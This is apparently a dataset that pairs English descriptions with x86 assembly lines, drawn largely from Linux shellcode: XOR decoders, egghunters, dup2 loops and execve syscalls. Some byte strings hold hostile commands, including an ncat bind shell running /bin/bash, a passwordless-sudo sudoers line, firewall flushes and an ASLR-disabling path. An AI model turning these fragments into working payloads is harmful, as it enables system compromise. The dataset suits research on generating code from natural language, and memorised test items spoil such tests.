define the function D4 and perform the xor operation between the byte of the shellcode and the 0x12 value,define function var0 and perform xor operation byte shellcode and var1 value,"D4 : \n xor byte [esi] , 0x12","var0 : \n xor byte [esi] , var1"
declare the data label,declare data label,data :,data :
"define the byte string ',ajm,pk#########'",define byte string var0,"db ' , ajm , pk#########'","db ' , ajm , pk#########'"
define a byte string and initialize it to '/bin/sh',define byte string and initialize it var0,db '/bin/sh',db var0
define the byte string '/bin/sh',define byte string var0,db '/bin/sh',db var0
define the byte string '/bin/sh#sh#',define byte string var0,db '/bin/sh#sh#',db var0
define the byte string '/etc/passwd#',define byte string var0,db '/etc/passwd#',db var0
define the byte string '/proc/sys/kernel/randomize_va_spacex',define byte string var0,db '/proc/sys/kernel/randomize_va_spacex',db var0
define the byte string '/sbin/insmod#/tmp/o.o',define byte string var0,db '/sbin/insmod#/tmp/o . o',db '/sbin/insmod#/tmp/o . o'
define the byte string '/sbin/ipchains#-f#',define byte string var0,db '/sbin/ipchains#-f#',db var0
define the byte string '/sbin/iptables#-f#',define byte string var0,db '/sbin/iptables#-f#',db var0
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd',define byte string var0,db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd',db var0
"define the byte string '0',10","define byte string var0,10","db '0' , 10","db var0 , 10"
define the byte string 'all all=(all) nopasswd: all',define byte string var0,"db 'all all=(all) nopasswd : all' , 0xa","db var0 , 0xa"
define the byte string 'cp /bin/sh /tmp/sh',define byte string var0,db 'cp /bin/sh /tmp/sh',db var0
initialize a string to 'egg mark',initialize string var0,db 'egg mark',db var0
define the byte string 'egg mark',define byte string var0,db 'egg mark',db var0
define the byte string 'my.txtx',define byte string var0,db 'my . txtx',db 'my . txtx'
define the byte string 'rm -f /tmp/f',define byte string var0,db 'rm -f /tmp/f',db var0
"define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b",define array bytes and initialize it var0,"db 0x3e , 0xcd , 0x5d , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b","db 0x3e , 0xcd , 0x5d , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b"
declare a byte contining 0x68,declare byte var0 var1,db 0x68,db var1
declare a byte with no label containing the value 0x68,declare byte no label containing value var0,db 0x68,db var0
declare a byte and initialize it to 0x80,declare byte and initialize it var0,db 0x80,db var0
declare an unlabeled byte initialized to 0x80,declare unlabeled byte initialized var0,db 0x80,db var0
"define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d",define array bytes and initialize it var0,"db 0x96 , 0xf0 , 0x5d , 0x96 , 0xef , 0x60 , 0x96 , 0xee , 0xbd , 0x18 , 0xda , 0x8d","db 0x96 , 0xf0 , 0x5d , 0x96 , 0xef , 0x60 , 0x96 , 0xee , 0xbd , 0x18 , 0xda , 0x8d"
define a byte and initialize it to 0xcd,define byte and initialize it var0,db 0xcd,db var0
define the byte 0xcd,define byte var0,db 0xcd,db var0
declare a byte with no label containing the value 10,declare byte no label containing value 10,db 10,db 10
declare an unlabeled byte initialized to 10,declare unlabeled byte initialized 10,db 10,db 10
define a byte and initialize it to 0xdeadbeef,define byte and initialize it var0,dd 0xdeadbeef,dd var0
decrement the bl register and jump to L1 if the result is not zero,decrement var0 register and jump var1 if result not zero,dec bl \n jnz L1,dec var0 \n jnz var1
decrement the byte at the address dl by one,decrement byte address dl one,dec byte dl,dec byte dl
decrement the byte in dl,decrement byte dl,dec byte dl,dec byte dl
decrement the cl register by one,decrement cl register one,dec cl,dec cl
decrement the contents of cl,decrement contents cl,dec cl,dec cl
decrement the contents of the cl register,decrement contents cl register,dec cl,dec cl
decrement the contents of the cl register and jump to the dup2 label if the result is not negative,decrement contents cl register and jump var0 label if result not negative,dec cl \n jns dup2,dec cl \n jns var0
decrement the contents of the cl register and jump to the loopinghere label if the result is not negative,decrement contents cl register and jump var0 label if result not negative,dec cl \n jns loopinghere,dec cl \n jns var0
decrement cl and jump to L2 if the result is not equal to zero,decrement cl and jump var0 if result not equal zero,dec cl \n jnz L2,dec cl \n jnz var0
decrement cl and jump to L2 if the result is zero,decrement cl and jump var0 if result zero,dec cl \n jz L2,dec cl \n jz var0
decrement the dl register by one,decrement dl register one,dec dl,dec dl
decrement the contents of the eax register,decrement contents var0 register,dec eax,dec var0
subtract one from the contents of eax,subtract one contents var0,dec eax,dec var0
decrement the eax register by one,decrement var0 register one,dec eax,dec var0
decrement eax,decrement var0,dec eax,dec var0
decrease ebp,decrease var0,dec ebp,dec var0
subtract one from the contents of ebx,subtract one contents var0,dec ebx,dec var0
decrement the ebx register by one,decrement var0 register one,dec ebx,dec var0
decrement ecx by 1,decrement var0 1,dec ecx,dec var0
decrement the contents of the ecx register,decrement contents var0 register,dec ecx,dec var0
decrement the ecx register by one,decrement var0 register one,dec ecx,dec var0
decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative,decrement contents var0 register and jump var1 label if result not negative,dec ecx \n jns _dup2_loop,dec var0 \n jns var1
decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative,decrement contents var0 register and jump 2f_loop label if result not negative,dec ecx \n jns 2f_loop,dec var0 \n jns 2f_loop
decrement the contents of the ecx register and jump to the dup2 label if the result is not negative,decrement contents var0 register and jump var1 label if result not negative,dec ecx \n jns dup2,dec var0 \n jns var1
decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative,decrement contents var0 register and jump var1 label if result not negative,dec ecx \n jns dup2loop,dec var0 \n jns var1
decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0,decrement var0 1 and jump var2 procedure var3 var0 equals 0,dec ecx \n jns dup2loop,dec var0 \n jns var2
decrement the contents of the ecx register and jump to the duploop label if the result is not negative,decrement contents var0 register and jump var1 label if result not negative,dec ecx \n jns duploop,dec var0 \n jns var1
decrement the contents of the ecx register and jump to the loop label if the result is not negative,decrement contents var0 register and jump loop label if result not negative,dec ecx \n jns loop,dec var0 \n jns loop
decrement the contents of the ecx register and jump to the loop2 label if the result is not negative,decrement contents var0 register and jump var1 label if result not negative,dec ecx \n jns loop2,dec var0 \n jns var1
decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero,decrement contents var0 register and jump var1 label if result zero,dec ecx \n jz counter_is_now_zero,dec var0 \n jz var1
decrement the edx register by one,decrement var0 register one,dec edx,dec var0
decrement edx,decrement var0,dec edx,dec var0
decrement the esp register by one,decrement esp register one,dec esp,dec esp
define decode label,define decode label,decode :,decode :
declare the decoder function,declare var0 function,decoder :,var0 :
define decoder function,define var0 function,decoder :,var0 :
declare the decoder label,declare decoder label,decoder :,decoder :
declare a constant size and set equal to 25,declare constant size and set equal 25,dim : equ 25,dim : equ 25
define dim to be 512 bytes large,define dim be 512 bytes large,dim : equ 512,dim : equ 512
divide the contents of eax by the word value stored at memory location value,divide contents var0 word value stored memory location value,div dword [value],div dword [value]
divide the contents of in eax by by the word value stored at memory location var,divide contents var0 by word value stored memory location var,div dword [var],div dword [var]
divide eax by ebx,divide var0 var1,div ebx,div var1
divide the contents of eax by the contents of ebx,divide contents var0 contents var1,div ebx,div var1
divide eax by ecx the result of the division is stored in eax and the remainder in edx,divide var0 var2 result division stored var0 and remainder var3,div ecx,div var2
divide eax by value in edx,divide var0 value var1,div edx,div var1
divide eax by esi,divide var0 var1,div esi,div var1
declare the do_dup label,declare var0 label,do_dup :,var0 :
define do_dup label,define var0 label,do_dup :,var0 :
declare the doit label,declare var0 label,doit :,var0 :
declare the done label,declare done label,done :,done :
declare the download label,declare download label,download :,download :
define download function,define var0 function,download :,var0 :
declare the dup2 label,declare var0 label,dup2 :,var0 :
define dup2 function,define var0 function,dup2 :,var0 :
delcare the dup2loop label,var0 var1 label,dup2loop :,var1 :
declare the duploop label,declare var0 label,duploop :,var0 :
define duploop function,define var0 function,duploop :,var0 :
define egg equal to 'egg ',define egg equal var0,egg equ 'egg ',egg equ var0
define egg1 equal to 'mark',define var0 equal var1,egg1 equ 'mark',var0 equ var1
declare the egghunter label,declare var0 label,egghunter :,var0 :
declare the end label,declare end label,end :,end :
declare the entrypoint label,declare var0 label,entrypoint :,var0 :
define even_number function,define var0 function,even_number :,var0 :
declare the execfile label,declare var0 label,execfile :,var0 :
define exit_call equal to 1,define var0 equal 1,exit_call equ 1,var0 equ 1
declare the exit_on_error label,declare var0 label,exit_on_error :,var0 :
define exit function,define var0 function,exit :,var0 :
define the exit label,define exit label,exit :,exit :
declare the exit label,declare exit label,exit :,exit :
define F2 and call the function function_2,define var0 and call function var1,F2 : \n call function_1,var0 : \n call function_1
in the function F2 jump to label L1 if the current byte of the shellcode is greater than 0x2 else add 0x2 to the byte of the shellcode and jump to L2,in function var0 jump label var1 if current byte shellcode greater var3 else add var3 byte shellcode and jump var6,"F2 : \n cmp byte [esi] , 0x2 \n jg L1 \n add byte [esi] , 0x2 \n jmp L2","var0 : \n cmp byte [esi] , var3 \n jg var1 \n add byte [esi] , var3 \n jmp var6"
declare F2 and point to the next byte in esi,declare var0 and point next byte var1,F2 : \n inc esi,var0 : \n inc var1
declare F2 and point to the next word in esi,declare var0 and point next word var1,F2 : \n inc esi \n inc esi,var0 : \n inc var1 \n inc var1
define F2 function and jump to L3,define var0 function and jump var1,F2 : \n jmp L3,var0 : \n jmp var1
in the function F2 negate bl and move bl to the next byte,in function var0 negate var1 and move var1 next byte,F2 : \n not bl \n inc bl,var0 : \n not var1 \n inc var1
"declare F2, negate bl and move bl to the next byte",declare var0 negate var1 and move var1 next byte,F2 : \n not bl \n inc bl,var0 : \n not var1 \n inc var1
"declare F2, negate bl and point to the next byte in bl",declare var0 negate var1 and point next byte var1,F2 : \n not bl \n inc bl,var0 : \n not var1 \n inc var1
in F2 point to the next byte of the eax register and jump to label L2,in var0 point next byte var1 register and jump label var2,F2 : inc eax \n jmp L1,var0 : inc var1 \n jmp L1
define F3 and call the function function_3,define var0 and call function var1,F3 : \n call function_1,var0 : \n call function_1
in the routine F3 jump to label L1 if the current byte of the shellcode is equal to 0x3 else move 0x3 into the byte in esi and jump to L2,in routine var0 jump label var1 if current byte shellcode equal var3 else move var3 byte var6 and jump var7,"F3 : \n cmp byte [esi] , 0x3 \n je L1 \n mov byte [esi] , 0x3 \n jmp L2","var0 : \n cmp byte [var6] , var3 \n je var1 \n mov byte [var6] , var3 \n jmp var7"
declare F3 function and point to the next byte in edi,declare var0 function and point next byte var1,F3 : \n inc edi,var0 : \n inc var1
declare F3 function and point to the next word in edi,declare var0 function and point next word var1,F3 : \n inc edi \n edi,var0 : \n inc var1 \n var1
define F3 and jump to L5,define var0 and jump var1,F3 : \n jmp L5,var0 : \n jmp var1
in the function F3 negate al and move al to the next byte,in function var0 negate al and move al next byte,F3 : \n not al \n inc al,var0 : \n not al \n inc al
"define the function F3, negate al and move al to the next byte",define function var0 negate al and move al next byte,F3 : \n not al \n inc al,var0 : \n not al \n inc al
"define the function F3, negate al and point to the next byte in al",define function var0 negate al and point next byte al,F3 : \n not al \n inc al,var0 : \n not al \n inc al
"define the function F3, move to the next byte of ebx and jump short to L2",define function var0 move next byte var1 and jump short var2,F3 : inc ebx \n jmp short L2,var0 : inc var1 \n jmp short var2
define F4 and call the function function_4,define var0 and call function var1,F4 : \n call function_1,var0 : \n call function_1
in the function F4 jump to label L1 if the byte specified by the address in esi is lower than 0x1 else subtract 0x1 from the byte at the address in esi and jump to L2,in function var0 jump label var1 if byte specified address var3 lower var5 else subtract var5 byte address var3 and jump var8,"F4 : \n cmp byte [esi] , 0x1 \n jl L1 \n sub byte [esi] , 0x1 \n jmp L2","var0 : \n cmp byte [var3] , var5 \n jl var1 \n sub byte [var3] , var5 \n jmp var8"
declare F4 and jump short to F5,declare var0 and jump short var1,F4 : \n jmp short L5,var0 : \n jmp short L5
in the function F4 negate dl and point to the next byte in the dl register,in function var0 negate dl and point next byte dl register,F4 : \n not dl \n inc dl,var0 : \n not dl \n inc dl
"declare the function F4, negate dl and move dl to the next byte",declare function var0 negate dl and move dl next byte,F4 : \n not dl \n inc dl,var0 : \n not dl \n inc dl
"declare F4, move to the next byte in ecx and jump to L2",declare var0 move next byte var1 and jump var2,F4 : inc ecx \n jmp L2,var0 : inc var1 \n jmp var2
define F5 and call the function function_5,define var0 and call function var1,F5 : \n call function_1,var0 : \n call function_1
in the function F5 jump to label L1 if the byte at the address in esi is greater than 0x2 else add 0x2 to the byte at the address in esi and jump to L2,in function var0 jump label var1 if byte address var3 greater var5 else add var5 byte address var3 and jump var8,"F5 : \n cmp byte [esi] , 0x2 \n jg L1 \n add byte [esi] , 0x2 \n jmp L2","var0 : \n cmp byte [var3] , var5 \n jg var1 \n add byte [var3] , var5 \n jmp var8"
declare F5 and jump to L1,declare var0 and jump var1,F5 : \n jmp L1,var0 : \n jmp var1
"define the function F5, increment edx and jump short to L3",define function var0 increment var1 and jump short var2,F5 : inc edx \n jmp short L3,var0 : inc var1 \n jmp short var2
in the routine F6 jump to label L1 if the byte at the address specified by esi is equal to 0x3 else move 0x3 into the byte in esi and jump to L2,in routine var0 jump label var1 if byte address specified var3 equal var5 else move var5 byte var3 and jump var8,"F6 : \n cmp byte [esi] , 0x3 \n je L1 \n mov byte [esi] , 0x3 \n jmp L2","var0 : \n cmp byte [var3] , var5 \n je var1 \n mov byte [var3] , var5 \n jmp var8"
define file as the byte string '/sbin/iptables#-f',define file byte string var0,file : db '/sbin/iptables#-f',file : db var0
declare the fileaddress label,declare var0 label,fileaddress :,var0 :
reserve filecontents variable of 128 bytes,reserve var0 variable 128 bytes,filecontents : resb 128,var0 : resb 128
create a string filename and initialize to 'readme.txt',create string filename and initialize var0,"filename : db 'readme . txt' , 0h","filename : db 'readme . txt' , 0h"
reserve a variable filename of 255 bytes,reserve variable filename 255 bytes,filename : resb 255,filename : resb 255
declare the fill label,declare fill label,fill :,fill :
define fill label,define fill label,fill :,fill :
declare the find_egg label,declare var0 label,find_egg :,var0 :
define find_egg function,define var0 function,find_egg :,var0 :
declare the format label,declare format label,format :,format :
declare the formatting label,declare formatting label,formatting :,formatting :
define function_1 and execute it,var0 var1 and execute it,function_1 : \n call [esp],var1 : \n call [esp]
declare function_2 and execute it,var0 var1 and execute it,function_2 : \n call [esp],var1 : \n call [esp]
declare function_3 and call it,var0 var1 and call it,function_3 : \n call [esp],var1 : \n call [esp]
define function_4 and call it,var0 var1 and call it,function_4 : \n call [esp],var1 : \n call [esp]
define function_5 and execute it,var0 var1 and execute it,function_5 : \n call [esp],var1 : \n call [esp]
define fupdisasm function,define var0 function,fupdisasm :,var0 :
define fupdisasm label,define var0 label,fupdisasm :,var0 :
declare _shell as global label,declare var0 global label,global _shell,global var0
declare of the global _start,declare global var0,global _start,global var0
global _start,global var0,global _start,global var0
define the program entry point,define program entry point,global _start,global _start
declare _start as global label,declare var0 global label,global _start,global var0
define google as the byte string '127.1.1.1 google.com',define google byte string var0,google db '127 . 1 . 1 . 1 google . com',google db '127 . 1 . 1 . 1 google . com'
define the byte string google and initialize it to '127.1.1.1 google.com',define byte string google and initialize it var0,google : db '127 . 1 . 1 . 1 google . com',google : db '127 . 1 . 1 . 1 google . com'
declare the gotocall label,declare var0 label,gotocall :,var0 :
create a string 'hello world!' plus a linefeed character,create string var0 plus var1 character,"hello : db 'hello world!' , 10","hello : db var0 , 10"
define hellolen equal to the length of the hello string,define var0 equal length hello string,hellolen : equ $-hello,var0 : equ $-hello
declare the here label,declare here label,here :,here :
define here label,define here label,here :,here :
increment the count variable,increment count variable,inc [count],inc [count]
increment the contents of the al register,increment contents al register,inc al,inc al
add 1 to ax,add 1 ax,inc ax,inc ax
increment ax,increment ax,inc ax,inc ax
increment the contents of the ax register,increment contents ax register,inc ax,inc ax
increment the contents of the bl register,increment contents var0 register,inc bl,inc var0
increment bx,increment var0,inc bx,inc var0
increment the contents of the bx register,increment contents var0 register,inc bx,inc var0
increment the byte at the address [esp+ecx] by one,increment the byte at the address [esp+ecx] by one,inc byte [esp+ecx],inc byte [esp+ecx]
increment the contents of the cl register,increment contents cl register,inc cl,inc cl
increment the memory variable count,increment memory variable count,inc count,inc count
increment dl,increment dl,inc dl,inc dl
increment dl register,increment dl register,inc dl,inc dl
increment the contents of the dl register,increment contents dl register,inc dl,inc dl
add one to the doubleword integer stored at memory location tmp,add one doubleword integer stored memory location var0,inc dword [tmp],inc dword [var0]
add one to the doubleword integer stored at memory location value,add one doubleword integer stored memory location value,inc dword [value],inc dword [value]
add one to the doubleword integer stored at location var,add one doubleword integer stored location var,inc dword [var],inc dword [var]
increment the contents of the eax register,increment contents var0 register,inc eax,inc var0
point to the next double word in eax,point next double word var0,inc eax \n inc eax \n inc eax \n inc eax,inc var0 \n inc var0 \n inc var0 \n inc var0
move to the next double word in the eax register,move next double word var0 register,inc eax \n inc eax \n inc eax \n inc eax,inc var0 \n inc var0 \n inc var0 \n inc var0
increment ebx register,increment var0 register,inc ebx,inc var0
increment the contents of the ebx register,increment contents var0 register,inc ebx,inc var0
increment ebx,increment var0,inc ebx,inc var0
point to the next byte in the ebx register,point next byte var0 register,inc ebx,inc var0
point to the next word in the ebx register,point next word var0 register,inc ebx \n inc ebx,inc var0 \n inc var0
move to the next word in the ebx register,move next word var0 register,inc ebx \n inc ebx,inc var0 \n inc var0
point to the next double word in ebx,point next double word var0,inc ebx \n inc ebx \n inc ebx \n inc ebx,inc var0 \n inc var0 \n inc var0 \n inc var0
move to the next double word in the ebx register,move next double word var0 register,inc ebx \n inc ebx \n inc ebx \n inc ebx,inc var0 \n inc var0 \n inc var0 \n inc var0
increment the contents of the ecx register,increment contents var0 register,inc ecx,inc var0
increment ecx,increment var0,inc ecx,inc var0
move to the next word in the ecx,move next word var0,inc ecx \n inc ecx,inc var0 \n inc var0
point to the next double word in ecx,point next double word var0,inc ecx \n inc ecx \n inc ecx \n inc ecx,inc var0 \n inc var0 \n inc var0 \n inc var0
move to the next double word in the ecx register,move next double word var0 register,inc ecx \n inc ecx \n inc ecx \n inc ecx,inc var0 \n inc var0 \n inc var0 \n inc var0
increment edi register,increment var0 register,inc edi,inc var0
increment the contents of the edx register,increment contents var0 register,inc edx,inc var0
next word in the edx,next word var0,inc edx \n inc edx,inc var0 \n inc var0
increment the contents of the esi register,increment contents var0 register,inc esi,inc var0
next word of the shellcode,next word shellcode,inc esi \n inc esi,inc esi \n inc esi
move to the next word of the encoded shellcode,move next word encoded shellcode,inc esi \n inc esi,inc esi \n inc esi
move to the next word of the shellcode,move next word shellcode,inc esi \n inc esi,inc esi \n inc esi
point to the next byte of the shellcode and jump to label L2,point next byte shellcode and jump label var0,inc esi \n jmp L1,inc esi \n jmp L1
move to the next byte in the shellcode and jump short to L2,move next byte shellcode and jump short var0,inc esi \n jmp short L2,inc esi \n jmp short var0
increment the contents of the esp register,increment contents esp register,inc esp,inc esp
declare the incaddr label,declare var0 label,incaddr :,var0 :
declare incpage function,declare var0 function,incpage :,var0 :
declare the init label,declare var0 label,init :,var0 :
execute the reboot syscall,execute reboot syscall,int 0x80,int 0x80
make the system call,make system call,int 0x80,int 0x80
system call interrupt,system call interrupt,int 0x80,int 0x80
system call interrupt 0x80,system call interrupt var0,int 0x80,int var0
execute execve with system call interrupt,execute execve system call interrupt,int 0x80,int 0x80
execute exit syscall,execute exit syscall,int 0x80,int 0x80
make the kernel call,make kernel call,int 0x80,int 0x80
make the system call to the kernel,make system call kernel,int 0x80,int 0x80
call kernel,call kernel,int 0x80,int 0x80
execute execve syscall,execute execve syscall,int 0x80,int 0x80
call sys_read,call var0,int 80h,int 80h
call sys_read to fill the buffer,call var0 fill buffer,int 80h,int 80h
call sys_write,call var0,int 80h,int 80h
call the kernel,call kernel,int 80h,int 80h
make kernel call to display line string,make kernel call display line string,int 80h,int 80h
make kernel call to exit program,make kernel call exit program,int 80h,int 80h
make sys_exit kernel call,make var0 kernel call,int 80h,int 80h
make sys_write kernel call,make var0 kernel call,int 80h,int 80h
make syscall to output the text to stdout,make syscall output text var0,int 80h,int 80h
make syscall to terminate the program,make syscall terminate program,int 80h,int 80h
make the syscall to terminate the program,make syscall terminate program,int 80h,int 80h
make the system calls to the kernel,make system calls kernel,int 80h,int 80h
jump to exi if greater,jump var0 if greater,ja exi,ja var0
jump to the exit label if the destination operand is greater than the source operand in the above comparison,jump exit label if destination operand greater source operand above comparison,ja exit,ja exit
jump to next label if the destination is greater than the source in the above comparison,jump next label if destination greater source above comparison,ja next,ja next
jump to write if greater,jump write if greater,ja write,ja write
perform an unsigned comparison and jump to 0xf3 if lower,perform unsigned comparison and jump var0 if lower,jb 0xf3,jb var0
jump to label modtest if below,jump label var0 if below,jb modtest,jb var0
jump to label next if below,jump label next if below,jb next,jb next
jump to label write if below,jump label write if below,jb write,jb write
jump to label done if below or equal,jump label done if below or equal,jbe done,jbe done
jump to the all label if the operands of the above comparison are equals,jump all label if operands above comparison equals,je all,je all
jump to connect if equal,jump connect if equal,je connec,je connec
jump to the connect label if the operands of the above comparison are equals,jump connect label if operands above comparison equals,je connect,je connect
if equal jump to label continue,if equal jump label continue,je continue,je continue
jump to label continue if equal,jump label continue if equal,je continue,je continue
jump to label done if equal,jump label done if equal,je done,je done
jump to even_numer if greater,jump var0 if greater,je even_number,je even_number
jump to label exit if equal to 0,jump label exit if equal 0,je exit,je exit
jump to the exit label if the operands of the above comparison are equals,jump exit label if operands above comparison equals,je exit,je exit
if equal then jump to label l7,if equal then jump label var0,je l7,je var0
jump short to encodedshellcode if equal,jump short var0 if equal,je short encodedshellcode,je short var0
jump to loc_402b13 if equal,jump var0 if equal,je short loc_402b13,je short var0
jump to label stop if equal,jump label stop if equal,je stop,je stop
jump to the code location labeled loop if the operands of the previous comparison are equal,jump code location labeled loop if operands previous comparison equal,jeq loop,jeq loop
jump if greater than to label finished,jump if greater label finished,jg finished,jg finished
jump to the _while_loop if lower,jump _while_loop if lower,jl _while_loop,jl _while_loop
jump to the _while_loop label if the destination operand is less than the source operand in the above comparison,jump _while_loop label if destination operand less source operand above comparison,jl _while_loop,jl _while_loop
jump if less than to label finished,jump if less label finished,jl finished,jl finished
jump to the wrap_around label if the destination operand is less than the source operand in the above comparison,jump var0 label if destination operand less source operand above comparison,jl wrap_around,jl var0
if it is less than or equal to 10 then jump to lp1,if it less or equal 10 then jump var0,jle lp1,jle var0
jump to label _accept,jump label var0,jmp _accept,jmp var0
jump to _read,jump var0,jmp _read,jmp var0
jump to the _return label,jump _return label,jmp _return,jmp _return
jump to _star,jump var0,jmp _star,jmp var0
jump to the _start label,jump var0 label,jmp _start,jmp var0
jump to the _while_loop label,jump _while_loop label,jmp _while_loop,jmp _while_loop
jump to the aslr_file label,jump var0 label,jmp aslr_file,jmp var0
jump to the instruction labeled begin,jump instruction labeled begin,jmp begin,jmp begin
jump to the call_egghunter label,jump var0 label,jmp call_egghunter,jmp var0
jump to callpop,jump var0,jmp callpop,jmp var0
jump to the callpop label,jump var0 label,jmp callpop,jmp var0
jump to the callz label,jump var0 label,jmp callz,jmp var0
jump to the carryon label,jump var0 label,jmp carryon,jmp var0
jump to connec,jump var0,jmp connec,jmp var0
jump to eax,jump var0,jmp eax,jmp var0
jump to the value stored in the eax register,jump value stored var0 register,jmp eax,jmp var0
jump to ecx,jump var0,jmp ecx,jmp var0
jump to edi,jump var0,jmp edi,jmp var0
jump to the edi label,jump var0 label,jmp edi,jmp var0
jump to edx,jump var0,jmp edx,jmp var0
jump to the encrypt label,jump encrypt label,jmp encrypt,jmp encrypt
jump to the entrypoint label,jump var0 label,jmp entrypoint,jmp var0
jump to the esp label,jump esp label,jmp esp,jmp esp
jump to fupdisasm+1,jump fupdisasm+1,jmp fupdisasm+1,jmp var0
jump to the address specified by the operation fupdisasm+1,jump address specified operation fupdisasm+1,jmp fupdisasm+1,jmp var0
jump to the address specified by the operation fupdisasm+3,jump address specified operation fupdisasm+3,jmp fupdisasm+3,jmp var0
jump to the jocker label,jump var0 label,jmp jocker,jmp var0
jump to label l20,jump label var0,jmp l20,jmp var0
jump to the label loop,jump label loop,jmp loop,jmp loop
jump to label multiplyloop,jump label var0,jmp multiplyloop,jmp var0
jump to nextarg label,jump var0 label,jmp nextarg,jmp var0
jump to the point in the code labeled nextchar,jump point code labeled var0,jmp nextchar,jmp var0
jump to the one label,jump one label,jmp one,jmp one
jump to the read label,jump read label,jmp read,jmp read
jump to the label read,jump label read,jmp read,jmp read
jump to label read,jump label read,jmp read,jmp read
jump to the reading label,jump reading label,jmp reading,jmp reading
jump to the shell label,jump shell label,jmp shell,jmp shell
jump to shellcode,jump shellcode,jmp shellcode,jmp shellcode
jump to the shellcode label,jump shellcode label,jmp shellcode,jmp shellcode
jump short to the _cmd label,jump short var0 label,jmp short _cmd,jmp short var0
jump short to the _execline label,jump short var0 label,jmp short _execline,jmp short var0
jump short to the _file label,jump short var0 label,jmp short _file,jmp short var0
jump short to the _load_data label,jump short _load_data label,jmp short _load_data,jmp short _load_data
jump short to _load_data label,jump short _load_data label,jmp short _load_data,jmp short _load_data
jump short to _star label,jump short var0 label,jmp short _star,jmp short var0
jump short to the _start label,jump short var0 label,jmp short _start,jmp short var0
jump short to the .exit label,jump short var0 label,jmp short . exit,jmp short . exit
jump short to 0x11,jump short var0,jmp short 0x11,jmp short var0
jump short to 0x2c,jump short var0,jmp short 0x2c,jmp short var0
jump short to 0x34,jump short var0,jmp short 0x34,jmp short var0
jump short to 0x63,jump short var0,jmp short 0x63,jmp short var0
jump short to the function call_decoder,jump short function var0,jmp short call_decoder,jmp short var0
jump short to the call_shellcode label,jump short var0 label,jmp short call_shellcode,jmp short var0
jump short to the callit label,jump short var0 label,jmp short callit,jmp short var0
jump short to the callme label,jump short var0 label,jmp short callme,jmp short var0
jump short to the cmd label,jump short var0 label,jmp short cmd,jmp short var0
jump short to the cycle label,jump short cycle label,jmp short cycle,jmp short cycle
jump short to cycle label,jump short cycle label,jmp short cycle,jmp short cycle
jump short to the function decode,jump short function decode,jmp short decode,jmp short decode
jump short to the decode label,jump short decode label,jmp short decode,jmp short decode
jump short to the decode_pr label,jump short var0 label,jmp short decode_pr,jmp short var0
jump short to the end label,jump short end label,jmp short end,jmp short end
jump short to exi label,jump short var0 label,jmp short exi,jmp short var0
jump short to the fileaddress label,jump short var0 label,jmp short fileaddress,jmp short var0
jump short to the formatting label,jump short formatting label,jmp short formatting,jmp short formatting
jump short to the four label,jump short four label,jmp short four,jmp short four
jump short to the gotocall label,jump short var0 label,jmp short gotocall,jmp short var0
jump short to the here label,jump short here label,jmp short here,jmp short here
jump short to the routine inc_dec,jump short routine var0,jmp short inc_dec,jmp short var0
jump short to the path label,jump short path label,jmp short path,jmp short path
jump short to the process_shellcode label,jump short var0 label,jmp short process_shellcode,jmp short var0
jump short to push_cmd,jump short var0,jmp short push_cmd,jmp short var0
jump short to the push_cmd label,jump short var0 label,jmp short push_cmd,jmp short var0
jump short to the read label,jump short read label,jmp short read,jmp short read
jump short to the rotate label,jump short rotate label,jmp short rotate,jmp short rotate
jump short to the search label,jump short search label,jmp short search,jmp short search
jump short to the setup label,jump short setup label,jmp short setup,jmp short setup
jump short to shellcode,jump short shellcode,jmp short shellcode,jmp short shellcode
jump short to stage,jump short stage,jmp short stage,jmp short stage
jump short to the stage label,jump short stage label,jmp short stage,jmp short stage
jump short to the todo label,jump short var0 label,jmp short todo,jmp short var0
jump short to the two label,jump short two label,jmp short two,jmp short two
jump to the two label,jump two label,jmp two,jmp two
define the jmp_search label,define var0 label,jmp_search :,var0 :
jump to 0xd8 it the carry flag is zero,jump var0 it carry flag zero,jnc 0xd8,jnc var0
if not equal jump to the _nex label,if not equal jump var0 label,jne _nex,jne var0
jump to the _next label if the operands of the above comparison are not equals,jump var0 label if operands above comparison not equals,jne _next,jne var0
jump to 804809a if not equal,jump 804809a if not equal,jne 804809a,jne 804809a
jump to 80480aa if not equal,jump var0 if not equal,jne 80480aa,jne var0
if the remainder is not equal to zero jump to local label checkbuzz,if remainder not equal zero jump local label var0,jne checkbuzz,jne var0
if the remainder is not equal to zero jump to local label checkint,if remainder not equal zero jump local label var0,jne checkint,jne var0
jump to the address specified by the label loop if the operands are not equals in the previous comparison,jump address specified label loop if operands not equals previous comparison,jne loop,jne loop
jump to the next_addr label if the operands of the above comparison are not equals,jump var0 label if operands above comparison not equals,jne next_addr,jne var0
if not equal jump to the label nextnumber,if not equal jump label var0,jne nextnumber,jne var0
jump to the label no_error if not equal,jump label var0 if not equal,jne no_error,jne var0
jump to retry if not equal,jump retry if not equal,jne retry,jne retry
if not equal jump short to the _while_loop,if not equal jump short _while_loop,jne short _while_loop,jne short _while_loop
jump to the _while_loop label if the operands of the above comparison are not equals,jump _while_loop label if operands above comparison not equals,jne short _while_loop,jne short _while_loop
jump to the _dup2_loop label if the previous instruction clears the sign flag,jump var0 label if previous instruction clears sign flag,jns _dup2_loop,jns var0
jump to 2f if the sign flag is zero,jump 2f if sign flag zero,jns 2f,jns 2f
jump to 3f if the sign flag is zero,jump var0 if sign flag zero,jns 3f,jns var0
jump to decode_pr if not signed,jump var0 if not signed,jns decode_pr,jns var0
jump to dup2 if not negative,jump var0 if not negative,jns dup2,jns var0
jump to the dup2 label if the previous instruction clears the sign flag,jump var0 label if previous instruction clears sign flag,jns dup2,jns var0
jump to duploop if not negative,jump var0 if not negative,jns duploop,jns var0
jump to the duploop label if the previous instruction clears the sign flag,jump var0 label if previous instruction clears sign flag,jns duploop,jns var0
